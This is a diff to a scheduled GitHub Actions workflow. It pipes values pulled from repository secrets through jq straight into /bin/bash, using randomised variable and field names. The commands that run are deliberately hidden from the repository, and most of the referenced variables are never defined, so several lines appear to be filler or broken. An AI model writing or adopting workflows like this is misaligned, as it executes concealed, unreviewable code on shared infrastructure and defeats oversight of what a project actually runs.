@@ -2,19 +2,22 @@ name: jiugongchang3
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
-jobs:  # 25960
+    - cron: '24 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jiugongchang3
         env:
-          ausp1: ${{ secrets.ausp1 }}
+          xvc89: ${{ secrets.xvc89 }}
         run: |
-          echo $ausp1 | jq -r .nmveh127 | /bin/bash
-          echo $u7 | jq -r .on5 | /bin/bash
-          echo $ekol56 | jq -r .g9745 | /bin/bash
-          echo $wgbxv4 | jq -r .eli6496 | /bin/bash
-          echo $dldw4452 | jq -r .u7755 | /bin/bash
+          echo $xvc89 | jq -r .cxia8449 | /bin/bash
+          echo $tno6 | jq -r .cev36011 | /bin/bash
+          echo $oa6208 | jq -r .kqznv7414 | /bin/bash
+          echo $k139 | jq -r .xbz99511 | /bin/bash
+          echo $zq77 | jq -r .bc885 | /bin/bash
+          echo $j13018 | jq -r .sa147 | /bin/bash
+          echo $hjx64637 | jq -r .aw1212 | /bin/bash
+          echo $hwyi5 | jq -r .e261 | /bin/bash
 
